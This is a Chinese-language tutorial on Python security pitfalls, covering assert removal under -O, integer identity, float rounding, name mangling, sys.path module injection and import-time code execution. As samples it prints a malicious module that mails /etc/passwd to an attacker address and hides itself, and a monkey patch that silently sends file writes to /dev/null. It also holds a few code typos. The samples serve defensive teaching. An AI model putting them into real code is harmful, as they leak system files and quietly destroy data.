# 不可不知的Python陷阱

::: tip 注意
以下内容全部基于`python3`
:::

## 断言语句

在python应用中使用`assert`语句来捕获不可能的条件是一个编程习惯：

```python
def verify_credentials(username, password):
    assert username and password, 'Credentials not supplied by caller'
    
    ... authenticate possibly null user with null password ...
```

然而，当将源码编译成优化的字节码后(例如`python -O`)，python并不会为`assert`语句生成任何指令，编译器会默默地删除那些程序员写的让程序免受畸形数据攻击的代码，让应用暴露在攻击中。

该漏洞的根本原因在于`assert机制`纯粹是为了测试的目的而设计的，正如在C++中的那样。所以程序员必须使用其他手段以保证数据的一致性。

## 可重用整数

python中万物皆对象。每个对象都有一个唯一的标识符，可以使用`id()`函数来获取。要找出两个变量或两个属性是否都指向同一个对象，可以使用`is`操作符。整数也是对象，因此`is`操作符确实是为他们定义的：

```python
>>> 999+1 is 1000
False
```

如果上面的结果看起来令人诧异，那么记住，`is`操作符是在两个对象的标识符上工作的——它并不比较它们的数值或其他值。然而：

```python
>>> 1+1 is 2
True
```

很奇怪对不对？对该行为的解释是：python维护了一个对象连接池，其中保有前几百个整数(小整数)，重用它们会内存和对象的创建。更让人凌乱的是，"小整数"的定义在不同的python版本中并不相同。

这里的应对措施是：绝对不要把`is`操作符用于值的比较上。`is`操作符是设计用来处理唯一对象标识符的。

## 浮点数比较

由于固定且有限的精度，以及十进制与二进制小数表示所产生的差异，使用浮点数可能很复杂。混乱的一个常见原因是，浮点数比较有时可能会产生意想不到的结果，例如：

```python
>>> 2.2 * 3.0 == 3.3 * 2.0
False
```

上面结果的原因实际上是舍入错误：

```python
>>> (2.2 * 3.0).hex()
'0x1.a666666666667p+2'
>>> (3.3*2.0).hex()
'0x1.a666666666666p+2'
```

一般来说，当重要的决定是基于算术运算的结果做出的，就必须要小心不要成为舍入错误的牺牲品。参见python文档中的[Floating Point Arithmetic: Issues and Limitations](https://docs.python.org/3/tutorial/floatingpoint.html)章节。

## 私有属性

python不支持对象属性隐藏。但有一个基于[双下划线属性重整](https://docs.python.org/3/tutorial/classes.html#tut-private)特性的解决方案。虽然属性名的修改[只发生在代码上](https://docs.python.org/3/reference/expressions.html#atom-identifiers)，但是硬编码到字符串常量的属性名保持不变。当一个双下划线的属性明显从`getattr()`/`setattr()`函数隐藏，这可能会导致混乱的行为。

```python
>>> classX(object):
        def __init__(self):
            self.__private = 1
        def get_private(self):
            return self.__private
        def has_private(self):
            return hasattr(self, '__private')
>>> x = X()
>>> x.has_private()
False
>>> x.get_private()
1
```

要让这个私有特性能用，类定义之外的属性并不执行属性重整(attribute mangling)。基于被引用的地方，它有效地将任意给定的双下划线属性"分裂"成两类。

```python
>>> class X(object):
        def __init__(self):
            self.__private = 1
>>> x = X()
>>> x.__private
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
AttributeError: 'X' object has no attribute '__private'
>>> x.__private = 2
>>> x.__private
2
>>> hasattr(x, "__private")
True
```

如果程序员依赖于双下划线属性来在他们的代码中做出重要决定，而不关注私有属性的不对称行为，那么这些小技巧会变成安全漏洞。

## 模块注入

python的模块导入系统功能强大而复杂。模块和包可以通过定义在[sys.path](https://docs.python.org/3/library/sys.html#sys.path)列表中的搜索路径找到的文件名或目录名导入。搜索路径初始化是一个复杂的过程，它也依赖于python版本、平台和本地配置。要对一个python应用程序进行成功攻击，攻击者需要找到一种方法来将恶意python模块揉入进python在尝试导入模块时会考虑的一个目录或可导入包文件。

处理措施是维护搜索路径中的所有目录和包文件的安全访问权限，以确保未经授权的用户无法对其进行写访问。请记住，调用python解释器的初始脚本所在的目录会自动插入到搜索路径中。

运行像这样的脚本来显示实际的搜索路径：

```bash
$ cat myapp.py
#!/usr/bin/python3
import sys
import pprint

pprint.pprint(sys.path)
```

在Windows平台，python进程的当前工作目录，而不是脚本所在位置，会被[注入](https://docs.python.org/3/using/windows.html#finding-modules)到搜索路径中。在UNIX平台，无论何时从标准输入或者命令行("-"或者"-c"或者"-m"参数)读入程序代码，当前工作目录都会被自动插入到`sys.path`中：

```python
$ echo "import sys, pprint; pprint.pprint(sys.path)" | python -
       ['',
        '/usr/lib/python3.3/site-packages/pip-7.1.2-py3.3.egg',
        '/usr/lib/python3.3/site-packages/setuptools-20.1.1-py3.3.egg',
        ...]
       $ python -c 'import sys, pprint; pprint.pprint(sys.path)'
       ['',
        '/usr/lib/python3.3/site-packages/pip-7.1.2-py3.3.egg',
        '/usr/lib/python3.3/site-packages/setuptools-20.1.1-py3.3.egg',
        ...]
       $
       $ cd /tmp
       $ python -m myapp
       ['',
        '/usr/lib/python3.3/site-packages/pip-7.1.2-py3.3.egg',
        '/usr/lib/python3.3/site-packages/setuptools-20.1.1-py3.3.egg',
        ...]
```

要处理从当前工作路径注入模块的风险，推荐在Windows运行python或者通过命令行传递代码之前，显式地修改目录到一个安全的目录。

另一个搜索路径可能的来源是`$PYTHONPATH`环境变量的内容。抵御`sys.path`不被进程环境污染的简单办法是传递`-E`选项给python解释器，这会让它忽略`$PYTHONPATH`变量。

## 导入时的代码执行

`import`语句实际上会导入被导入模块中的代码的执行，这一事实并不明显。这就是为什么甚至导入不可信模块或包是有风险的。导入像这样的简单模块可能会导致不愉快的结果：

```python
$ cat malicious.py
import os
import sys

os.system('cat /etc/passwd | mail attacker@blackhat.com')

del sys.modules['malicious']  # 假装它没有被导入
$ python
>>> import malicoius
>>> dir(malicious)
Traceback (most recent call last):
       NameError: name 'malicious' is not defined
```

与`sys.path`入口注入攻击相结合，它可能为进一步的系统漏洞利用铺平道路。

## 猴子补丁(monkey patching)

运行时修改python对象属性的过程称之为猴子补丁(monkey patching)。作为动态语言，python完全支持运行时程序自省和代码突变。一旦以某种方式导入了一个恶意模块，那么任何现有的可变对象可被不知不觉地在没有程序员同意的情况下被打猴子补丁。考虑以下情况：

```python
$ cat nowrite.py
import builtins

def malicious_open(*args, **kwargs):
    if len(args) > 1 and args[1] == 'w':
        args = ('/dev/null',) + args[1:]
    return original_open(*args, **kwargs)

original_open(), builtins.open = builtins.open, malicious_open
```

如果python解释器执行了上面的代码，那么任何写到文件的东西都不会存储到文件系统中：

```python
>>> import nowrite
>>> f = open('data.txt', 'w')
>>> f.write('data to store')
>>> f.close()
>>> f = open('data.txt')
raceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/Users/username/nowrite.py", line 6, in malicious_open
    return original_open(*args, **kwargs)
FileNotFoundError: [Errno 2] No such file or directory: 'data.txt'
```

攻击者可以利用python垃圾回收器(`gc.get_objects()`)来掌握现有的所有对象，并黑进它们中任意一个。

python对象的类型是由`__class__`属性决定的。邪恶的攻击者可以通过依靠改变活动对象的类型来令人绝望的把事情搞砸：

```python
>>> class X(object): pass
... 
>>> class Y(object): pass
... 
>>> x_obj = X()
>>> x_obj
<__main__.X object at 0x7f62dbe5e010>
>>> isinstance(x_obj, X)
True
>>> x_obj.__class__ = Y
>>> x_obj
<__main__.Y object at 0x7f62dbe5d350>
>>> isinstance(x_obj, X)
False
>>> isinstance(x_obj, Y)
True
```

对抗恶意猴子补丁的唯一处理措施是保证导入的python模块的真实性和完整性

## 笔记整理来源

1. [不可不知的一点 Python 陷阱](https://juejin.im/entry/58fc232ca22b9d00659dab89)